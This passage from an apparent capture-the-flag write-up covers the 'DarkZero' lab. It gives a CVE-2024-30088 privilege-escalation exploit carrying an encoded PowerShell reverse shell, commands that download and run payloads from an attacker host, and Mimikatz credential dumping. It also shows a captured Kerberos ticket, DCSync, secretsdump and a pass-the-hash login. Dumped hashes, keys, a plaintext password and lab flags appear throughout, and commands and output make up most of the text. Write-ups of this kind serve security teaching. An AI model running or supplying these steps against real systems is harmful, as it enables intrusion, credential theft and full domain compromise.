	CreateProcessFromHandle(hWinLogon, (LPSTR)"C:\\Windows\\system32\\cmd.exe /c start /b powershell -nop -ep bypass -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANwAyACIALAAxADEAMQAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==");
```

Build the POC

```powershell
msbuild .\poc.sln /p:Configuration=Release /p:Platform=x64
```

![](/assets/obsidian/0cdfeffc2f04cfc95a5fd00ef5a75c77.png)

Link the POC to our http server's web directory

```bash
┌──(bravosec㉿fsociety)-[~/www]
└─$ ln -s /media/sf_Kali/WinTools/CVE-2024-30088/x64/Release/poc.exe
```

Start http web server

```bash
┌──(bravosec㉿fsociety)-[~/www]
└─$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Start reverse shell listener

```bash
rlwrap -cAr nc -lvnp 1111
```

Download and run the exploit on target machine

> We'll have to press `ENTER` key a couple times to continue next exploit stages
> 
> ![](/assets/obsidian/b6559614a43aeeb34da3ddf5d20ccc3d.png)
> 
> ![](/assets/obsidian/d9e0d7be815fe9da30391805ee18d77d.png)
>
{: .prompt-tip }

```bash
PS C:\Windows\system32> (new-object System.Net.WebClient).DownloadFile('http://10.10.14.72:80/poc.exe', '\programdata\poc.exe'); \programdata\poc.exe
Found object!
hToken: b8, kTokenAddr: FFFF870F0D72E060

Found target offset value: 0x5f0
Target address = 0x283754905f0
Got Winlogon handle: 0x428

Enjoy your new SYSTEM process
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/DarkZero]
└─$ rlwrap -cAr nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.72] from (UNKNOWN) [10.10.11.89] 63256
whoami
nt authority\system
PS C:\Windows\system32> ls -fo -r C:\Users\Administrator\Desktop\


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-         7/29/2025   5:58 AM            282 desktop.ini
-a----        10/19/2025   2:18 PM             34 user.txt
PS C:\Windows\system32> cat C:\Users\Administrator\Desktop\user.txt
60fac0de97fe2486d4dce78865bc272e
```


# Root Flag
---

## Shell as Administrator on DC01


### Harvesting

```bash
PS C:\Windows\system32> iex (new-object net.webclient).DownloadString('http://10.10.14.72:80/Empire/credentials/Invoke-Mimikatz.ps1')
PS C:\Windows\system32> Invoke-Mimikatz
Hostname: DC02.darkzero.ext / authority\system-authority\system

  .#####.   mimikatz 2.2.0 (x64) #19041 Jan 29 2023 07:49:10
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 299496 (00000000:000491e8)
Session           : Batch from 0
User Name         : Administrator
Domain            : darkzero-ext
Logon Server      : DC02
Logon Time        : 10/19/2025 2:21:24 PM
SID               : S-1-5-21-1969715525-31638512-2552845157-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : darkzero-ext
         * NTLM     : 6963aad8ba1150192f3ca6341355eb49
[...]
```

```bash
PS C:\Windows\system32> Invoke-Mimikatz -Command '"privilege::debug" "lsadump::dcsync /user:krbtgt"'
Hostname: DC02.darkzero.ext / authority\system-authority\system

  .#####.   mimikatz 2.2.0 (x64) #19041 Jan 29 2023 07:49:10
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # privilege::debug
Privilege '20' OK

mimikatz(powershell) # lsadump::dcsync /user:krbtgt
[DC] 'darkzero.ext' will be the domain
[DC] 'DC02.darkzero.ext' will be the DC server
[DC] 'krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 7/29/2025 7:21:27 AM
Object Security ID   : S-1-5-21-1969715525-31638512-2552845157-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 43e27ea2be22babce4fbcff3bc409a9d
    ntlm- 0: 43e27ea2be22babce4fbcff3bc409a9d
    lm  - 0: 1ac7471679feb74e603537674c95973e

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 92a68445895af80ee4101f6644bae1c7

* Primary:Kerberos-Newer-Keys *
    Default Salt : DARKZERO.EXTkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : e1b65b38be61373cad5930ace5bb65161460324e0c42c0ea14a73e4ac2314f4c
      aes128_hmac       (4096) : 133d768fd3a1214bba00fec89d2e56c1
      des_cbc_md5       (4096) : d04f0b3d3b385b31
[...]
```


### (Failed) 389 - ldap : Hash guessing

```bash
┌──(bravosec㉿fsociety)-[~/htb/DarkZero]
└─$ nxc ldap DC01.darkzero.htb -u 'Administrator' -H '6963aad8ba1150192f3ca6341355eb49' -k
LDAP        DC01.darkzero.htb 389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:darkzero.htb) (signing:Enforced) (channel binding:When Supported)
LDAP        DC01.darkzero.htb 389    DC01             [-] darkzero.htb\Administrator:6963aad8ba1150192f3ca6341355eb49 KDC_ERR_PREAUTH_FAILED

┌──(bravosec㉿fsociety)-[~/htb/DarkZero]
└─$ nxc ldap DC01.darkzero.htb -u 'Administrator' -H '6963aad8ba1150192f3ca6341355eb49' --local-auth
LDAP        10.10.11.89     389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:darkzero.htb) (signing:Enforced) (channel binding:When Supported)
LDAP        10.10.11.89     389    DC01             [-] darkzero.htb\Administrator:6963aad8ba1150192f3ca6341355eb49
```


### Forest trusts - Unconstrained delegation (KUD)

- `darkzero.ext` (Primary domain) and `darkzero.htb` has **two-way** trusts

```bash
PS C:\Windows\system32> nltest /domain_trusts /all_trusts
List of domain trusts:
    0: darkzero darkzero.htb (NT 5) (Direct Outbound) (Direct Inbound) ( Attr: foresttrans )
    1: darkzero-ext darkzero.ext (NT 5) (Forest Tree Root) (Primary Domain) (Native)
The command completed successfully
```

> https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet?tab=readme-ov-file#cross-forest-attacks

> 
> Since domain controllers have `Unconstrained Delegation` enabled by default, we can: 
> 
> 1. Coerce authentication from `DC01$.darkzero.htb` to `DC02$.darkzero.ext` via mssql's `xp_dirtree` procedure to obtain `DC01$.darkzero.htb`'s TGT
> 2. Use `DC01$`'s TGT to request **DCSync**
{: .prompt-info }

Monitor TGTs

```bash
PS C:\Windows\system32> $data = (New-Object System.Net.WebClient).DownloadData('http://10.10.14.72/SharpCollection/NetFramework_4.5_Any/Rubeus.exe')
PS C:\Windows\system32> $assem = [System.Reflection.Assembly]::Load($data)
PS C:\Windows\system32> [Rubeus.Program]::Main("monitor /nowrap /interval:1 /filteruser:DC01$".Split())

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: TGT Monitoring
[*] Target user     : DC01$
[*] Monitoring every 1 seconds for new TGTs
```

Coerce **kerberos** authentication of `DC01$.darkzero.htb` to `DC02$.darkzero.ext`

```bash
┌──(bravosec㉿fsociety)-[~/htb/DarkZero]
└─$ KRB5CCNAME="$(pt get ticket)" mssqlclient.py -k $(pt get rhost) -windows-auth
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (darkzero\john.w  guest@master)> show_query
SQL (darkzero\john.w  guest@master)> xp_dirtree \\DC02.darkzero.ext\xd
[%] exec master.sys.xp_dirtree '\\DC02.darkzero.ext\xd',1,1
subdirectory   depth   file
------------   -----   ----
```

```bash
[*] 10/20/2025 2:51:01 AM UTC - Found new TGT:

  User                  :  DC01$@DARKZERO.HTB
  StartTime             :  10/19/2025 7:14:18 PM
  EndTime               :  10/20/2025 3:40:38 AM
  RenewTill             :  10/26/2025 5:40:38 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDERBUktaRVJPLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uSFRCo4IETDCCBEigAwIBEqEDAgECooIEOgSCBDaL160AksnLVNOSrPwtPvVbMWU/qOdrj+EMfaaaivvKb1DpDdG3UCshzjd16NNB4vlbkRHr77fEdrODCIMDvAdYljduH61e6hfyJ0H0R2T0+b3iT0ZiBdGLVloSJlz59xUTvrr05WGbpbT0mmSeVhetxz4DT5YINWv6H1Ui7PS7myy7ruCRU7F3CeDLS/6cAR5BtZMCJelHOnuWwV6vmhPlxdTJN7ARcx02i5Wq5CD9t2LS7vkRSMhknBKGap2POOTGgltHhU9KF+rDyvSI0vl42MgMoDKBlIJUNtwpVCcNOfOpklSJOdnhhHKQQPRMM7l6QeDfzj5oKe4LPeNOXeVAKl3gbOIGfvqkRBMC+ORZfzakq9VTZodRyXYwA5LFX0AaE05ty20RDBw/sVoicH6DE+T5YsZ5qUmVBFN3sQ/EprV+nCQUvf+LYdlX+XQrif0gd5bOLi1FcToGrwiyT2p633CwvwOJEWDsppEwKz/arMK/mGq0yGf7HjTfeTb6zBvFX+GiKYFNoSKg0+p1dAX7/qJhoi5/tKzxhigo34om70kHr9Gsz5fizfoq2xI81v3M/E+RnrAYFQZaKWOwTcjnUwqsHlmE9PVtGwYMJzis1JDG8cB0iR/YwS1bJlpAaNLDyHfFIF5bTTrKrVTwQ5aVXWwIbJWWVgvaFVu1dTSuyaZzJyZ1fiymPghotxyqR/q699vKv2eE9AGEqu+PbvRFbqLv83MPiz2KnP9lB2RdDq0cjWAfJmsf0/sqjGW9wZMU0myiQENLntmYXoHswcvH/CSNt0n2ID8+/Sg594VyeeKCMbytXgP2izzZAn3+vCEUvRCGqs6QFQzjdQP1mZ8fqBajPTll6wLQypNgn/21bR0R6Z2vdHIu4EV5yNZMMN1feCA9dT7IfBICrLvsqptaZWnQQk9aSYcoV5izMdfLZJK0gwYMwTw7A856eM2hgzA1LZk7HkHPDApNqNmDTfZqWdYVdwxyqf1NCsbcpWSlL0trgeAO+Rg6FCGbaJfvFiU5CeW5FRQcsCG91TO4Nk4EAcbXTnzW1OCAaTzgYcWq7RaNSNw+dbIgcQ1hMNyXrckBNERa4onTWg1VounC+2WP4t9+Bqxr2CqfwE/XrOEPL6beIj0cmsEZvqbpxgpaWOSoiOS7Cgw6r832bpedUBt+bkvanuPE5XObKQztXpxoFj/olgFx8cm03rfm81gvE7eZypGYsCwP9DmtqbQ6wGP4oh1YJhg4o0cNNhnWeTT6uDXcl/JeBEHnX8sV0nRyIqNp5MGHiRn8vA4g94t60z08/UHFUmwFxZl0z2XbcYNUkmOENaOWSlmAf8rZylkJHg5jYuWr2IfmPV1aTqqg4/vOQO1OARxOEGiPa2Fx7oTJWWzWfWeEVGQscqUHyDT08XRf+Id2lhERL7RYQQJXz/LL7TGPaAdBo4HjMIHgoAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKzApoAMCARKhIgQgGGwjK2axksEuGUoMJRotd4MIiHvwIKxZ7jxXJJmRnNChDhsMREFSS1pFUk8uSFRCohIwEKADAgEBoQkwBxsFREMwMSSjBwMFAGChAAClERgPMjAyNTEwMjAwMjE0MThaphEYDzIwMjUxMDIwMTA0MDM4WqcRGA8yMDI1MTAyNzAwNDAzOFqoDhsMREFSS1pFUk8uSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxEQVJLWkVSTy5IVEI=

[*] Ticket cache size: 1
```


### DCsync

Convert ticket from `kirbi` to `ccache`

```bash
┌──(bravosec㉿fsociety)-[~/htb/DarkZero]
└─$  echo 'doIFjDCCBYigAwIBBaEDAgEWooIElDCCBJBhggSMMIIEiKADAgEFoQ4bDERBUktaRVJPLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMREFSS1pFUk8uSFRCo4IETDCCBEigAwIBEqEDAgECooIEOgSCBDaL160AksnLVNOSrPwtPvVbMWU/qOdrj+EMfaaaivvKb1DpDdG3UCshzjd16NNB4vlbkRHr77fEdrODCIMDvAdYljduH61e6hfyJ0H0R2T0+b3iT0ZiBdGLVloSJlz59xUTvrr05WGbpbT0mmSeVhetxz4DT5YINWv6H1Ui7PS7myy7ruCRU7F3CeDLS/6cAR5BtZMCJelHOnuWwV6vmhPlxdTJN7ARcx02i5Wq5CD9t2LS7vkRSMhknBKGap2POOTGgltHhU9KF+rDyvSI0vl42MgMoDKBlIJUNtwpVCcNOfOpklSJOdnhhHKQQPRMM7l6QeDfzj5oKe4LPeNOXeVAKl3gbOIGfvqkRBMC+ORZfzakq9VTZodRyXYwA5LFX0AaE05ty20RDBw/sVoicH6DE+T5YsZ5qUmVBFN3sQ/EprV+nCQUvf+LYdlX+XQrif0gd5bOLi1FcToGrwiyT2p633CwvwOJEWDsppEwKz/arMK/mGq0yGf7HjTfeTb6zBvFX+GiKYFNoSKg0+p1dAX7/qJhoi5/tKzxhigo34om70kHr9Gsz5fizfoq2xI81v3M/E+RnrAYFQZaKWOwTcjnUwqsHlmE9PVtGwYMJzis1JDG8cB0iR/YwS1bJlpAaNLDyHfFIF5bTTrKrVTwQ5aVXWwIbJWWVgvaFVu1dTSuyaZzJyZ1fiymPghotxyqR/q699vKv2eE9AGEqu+PbvRFbqLv83MPiz2KnP9lB2RdDq0cjWAfJmsf0/sqjGW9wZMU0myiQENLntmYXoHswcvH/CSNt0n2ID8+/Sg594VyeeKCMbytXgP2izzZAn3+vCEUvRCGqs6QFQzjdQP1mZ8fqBajPTll6wLQypNgn/21bR0R6Z2vdHIu4EV5yNZMMN1feCA9dT7IfBICrLvsqptaZWnQQk9aSYcoV5izMdfLZJK0gwYMwTw7A856eM2hgzA1LZk7HkHPDApNqNmDTfZqWdYVdwxyqf1NCsbcpWSlL0trgeAO+Rg6FCGbaJfvFiU5CeW5FRQcsCG91TO4Nk4EAcbXTnzW1OCAaTzgYcWq7RaNSNw+dbIgcQ1hMNyXrckBNERa4onTWg1VounC+2WP4t9+Bqxr2CqfwE/XrOEPL6beIj0cmsEZvqbpxgpaWOSoiOS7Cgw6r832bpedUBt+bkvanuPE5XObKQztXpxoFj/olgFx8cm03rfm81gvE7eZypGYsCwP9DmtqbQ6wGP4oh1YJhg4o0cNNhnWeTT6uDXcl/JeBEHnX8sV0nRyIqNp5MGHiRn8vA4g94t60z08/UHFUmwFxZl0z2XbcYNUkmOENaOWSlmAf8rZylkJHg5jYuWr2IfmPV1aTqqg4/vOQO1OARxOEGiPa2Fx7oTJWWzWfWeEVGQscqUHyDT08XRf+Id2lhERL7RYQQJXz/LL7TGPaAdBo4HjMIHgoAMCAQCigdgEgdV9gdIwgc+ggcwwgckwgcagKzApoAMCARKhIgQgGGwjK2axksEuGUoMJRotd4MIiHvwIKxZ7jxXJJmRnNChDhsMREFSS1pFUk8uSFRCohIwEKADAgEBoQkwBxsFREMwMSSjBwMFAGChAAClERgPMjAyNTEwMjAwMjE0MThaphEYDzIwMjUxMDIwMTA0MDM4WqcRGA8yMDI1MTAyNzAwNDAzOFqoDhsMREFSS1pFUk8uSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxEQVJLWkVSTy5IVEI=' | base64 -d > x.kirbi

┌──(bravosec㉿fsociety)-[~/htb/DarkZero]
└─$ ticketConverter.py x.kirbi 'DC01$.ccache'
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies

[*] converting kirbi to ccache...
[+] done
```

Request **DCSync** to get `Administrator`'s secrets

```bash
┌──(bravosec㉿fsociety)-[~/htb/DarkZero]
└─$ KRB5CCNAME='DC01$.ccache' secretsdump.py -k DC01.darkzero.htb -just-dc-user Administrator
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5917507bdf2ef2c2b0a869a1cba40726:::
[*] Kerberos keys grabbed
Administrator:0x14:2f8efea2896670fa78f4da08a53c1ced59018a89b762cbcf6628bd290039b9cd
Administrator:0x13:a23315d970fe9d556be03ab611730673
Administrator:aes256-cts-hmac-sha1-96:d4aa4a338e44acd57b857fc4d650407ca2f9ac3d6f79c9de59141575ab16cabd
Administrator:aes128-cts-hmac-sha1-96:b1e04b87abab7be2c600fc652ac84362
Administrator:0x17:5917507bdf2ef2c2b0a869a1cba40726
[*] Cleaning up...
```


### 5985 - Winrm

```bash
┌──(bravosec㉿fsociety)-[~/htb/DarkZero]
└─$ evil-winrm -i 10.10.11.89 -u 'Administrator' -H '5917507bdf2ef2c2b0a869a1cba40726'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
darkzero\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ..\Desktop\root.txt
77c2533de94cb67a3c33922634ad6c32
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```


# Additional
---

## Post exploitation


### Secrets

```bash
┌──(bravosec㉿fsociety)-[~/htb/DarkZero]
└─$ KRB5CCNAME="$(pt get ticket)" secretsdump.py -k $(pt get dc_fqdn) -outputfile secretsdump -history
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x8a6c03715ce8a8d26720e83ffe01c780
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5917507bdf2ef2c2b0a869a1cba40726:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
darkzero\DC01$:plain_password_hex:3d80df5c5563bd7ceaff858df6df6b78d62abac7e53d1897ba5662fbdb87b1e9aadbffcba05119d4da831820ec0eceb6e3758dae71b091fc50432581b40e46c00fa5505867efd64172e623340589ad7a75ff9b1ac55bc894cbc0f8c5cade43f103d550451df40af3c54e5dc7de5056810ed727a12a0656f744b2a6abb9ff611b24cb4ef0f2009c896cb2b651d2476470b2a49a873198c721503f80e97336d1f03bc3ea3f11299c0660e8d2d9584f38117ab5e059a6ba76d1981b08e1f5573963f57e8dbed5115766a568d6cc73d2e08131b5d7f32d4707ce79621bd8edf117c6c5d96a09f79813271de5a3a521c3676543d855f5ce14d6effddf7dbcac00046e30c8f0359ed9ea3b59fb240e933bad36d27444782ee78616da5b403a016f019079b02be3642cf3010d6b24222e27b2b5a01df6dbe567cdbab8d93b9410771d359028f951910c3681d59bdac18bb2f98f61ddc7660f147ccb21742fe11b3516c73177f83f7a1ccff6a4a96ca887bb54dc9c247c791589e25598dfebad0d5a173e0b81ac301d5bfae9034ea7c24a753edb71028f5691a38bf408220edd67ed1f1c08bcc638a8f9488ac7098aaa8bd96644e7eb7139cbe241394c230b78ab2f6c47158c3ec51179cfb998ed76289a8a5b56bf72a2ab66430f8cf6cd959a4c830e21267614283662701fce52614dc9b4a1d3d3c205bf5aa8f7c33ca89d09f20c790a
darkzero\DC01$:aad3b435b51404eeaad3b435b51404ee:d02e3fe0986e9b5f013dad12b2350b3a:::
[*] DPAPI_SYSTEM
dpapi_machinekey:0x48249fb0f4cf23ecbef54affc2b21d65717bf7df
dpapi_userkey:0xb8820f0412fc851cca8aa426248e7f37af5dd0b2
[*] DPAPI_SYSTEM_history
dpapi_machinekey:0xb4f790147659aab69d9de74fb3bdf4f4e95d7f93
dpapi_userkey:0x10e5c98785bf6ca0bb4e1d4d24afbf06339bbb7b
[*] NL$KM
 0000   FA 36 C7 D5 C0 82 AB B5  78 E1 17 F0 5E 36 13 5B   .6......x...^6.[
 0010   A5 9F C0 9C 38 A8 C4 34  FE 20 F7 2B D9 A2 8C AF   ....8..4. .+....
 0020   71 F2 E0 D2 09 A1 EC 09  EB DE 9B 8C F5 4A E6 2D   q............J.-
 0030   6B 1D 32 16 A2 ED B4 AE  F1 51 AE 5B 41 E5 4E B6   k.2......Q.[A.N.
NL$KM:fa36c7d5c082abb578e117f05e36135ba59fc09c38a8c434fe20f72bd9a28caf71f2e0d209a1ec09ebde9b8cf54ae62d6b1d3216a2edb4aef151ae5b41e54eb6
[*] NL$KM_history
 0000   FA 36 C7 D5 C0 82 AB B5  78 E1 17 F0 5E 36 13 5B   .6......x...^6.[
 0010   A5 9F C0 9C 38 A8 C4 34  FE 20 F7 2B D9 A2 8C AF   ....8..4. .+....
 0020   71 F2 E0 D2 09 A1 EC 09  EB DE 9B 8C F5 4A E6 2D   q............J.-
 0030   6B 1D 32 16 A2 ED B4 AE  F1 51 AE 5B 41 E5 4E B6   k.2......Q.[A.N.
NL$KM_history:fa36c7d5c082abb578e117f05e36135ba59fc09c38a8c434fe20f72bd9a28caf71f2e0d209a1ec09ebde9b8cf54ae62d6b1d3216a2edb4aef151ae5b41e54eb6
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5917507bdf2ef2c2b0a869a1cba40726:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:64f4771e4c60b8b176c3769300f6f3f7:::
john.w:2603:aad3b435b51404eeaad3b435b51404ee:44b1b5623a1446b5831a7b3a4be3977b:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:d02e3fe0986e9b5f013dad12b2350b3a:::
darkzero-ext$:2602:aad3b435b51404eeaad3b435b51404ee:95e4ba6219aced32642afa4661781d4b:::
darkzero-ext$_history0:2602:aad3b435b51404eeaad3b435b51404ee:95e4ba6219aced32642afa4661781d4b:::
darkzero-ext$_history1:2602:aad3b435b51404eeaad3b435b51404ee:4e1e0cb1a5c28010572b3d725e9a164e:::
darkzero-ext$_history2:2602:aad3b435b51404eeaad3b435b51404ee:4e1e0cb1a5c28010572b3d725e9a164e:::
[*] Kerberos keys grabbed
Administrator:0x14:2f8efea2896670fa78f4da08a53c1ced59018a89b762cbcf6628bd290039b9cd
Administrator:0x13:a23315d970fe9d556be03ab611730673
Administrator:aes256-cts-hmac-sha1-96:d4aa4a338e44acd57b857fc4d650407ca2f9ac3d6f79c9de59141575ab16cabd
Administrator:aes128-cts-hmac-sha1-96:b1e04b87abab7be2c600fc652ac84362
Administrator:0x17:5917507bdf2ef2c2b0a869a1cba40726
krbtgt:aes256-cts-hmac-sha1-96:6330aee12ac37e9c42bc9af3f1fec55d7755c31d70095ca1927458d216884d41
krbtgt:aes128-cts-hmac-sha1-96:0ffbe626519980a499cb85b30e0b80f3
krbtgt:0x17:64f4771e4c60b8b176c3769300f6f3f7
john.w:0x14:f6d74915f051ef9c1c085d31f02698c04a4c6804d509b7c4442e8593d6d957ea
john.w:0x13:7b145a89aed458eaea530a2bd1eb93bd
john.w:aes256-cts-hmac-sha1-96:49a6d3404e9d19859c0eea1036f6e95debbdea99efea4e2c11ee529add37717e
john.w:aes128-cts-hmac-sha1-96:87d9cbd84d85c50904eba39d588e47db
john.w:0x17:44b1b5623a1446b5831a7b3a4be3977b
DC01$:aes256-cts-hmac-sha1-96:25e1e7b4219c9b414726983f0f50bbf28daa11dd4a24eed82c451c4d763c9941
DC01$:aes128-cts-hmac-sha1-96:9996363bffe713a6777597c876d4f9db
DC01$:0x17:d02e3fe0986e9b5f013dad12b2350b3a
darkzero-ext$:aes256-cts-hmac-sha1-96:eec6ace095e0f3b33a9714c2a23b19924542ba13a3268ea6831410020e1c11f3
darkzero-ext$:aes128-cts-hmac-sha1-96:3efb8a66f0a09fbc6602e46f22e8fc1c
darkzero-ext$:0x17:95e4ba6219aced32642afa4661781d4b
[*] Cleaning up...
```


### Files

```bash

```


### Client side activities


#### Keylogging & Clipboard history

```bash

```


#### Browser

```bash

```


#### Files & directories access history

```bash

```


#### Application history

```bash

```


## Automated MSSQL exploitation

> https://github.com/dadevel/mssql-spider

```bash
mssql-spider -w -u john.w -p 'RFulUtONCOL!' -t DC01.darkzero.htb --exec-clr /opt/sectools/win/custom/bin/SharpProcedure.dll Run cmd.exe '/c echo %USERNAME%'
```

![](/assets/obsidian/12de5b38d3e8d53227a51bcc7d4c455d.png)


## Intended path - Shell as nt authority system on DC02


### X

```bash
PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeCreateGlobalPrivilege       Create global objects          Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```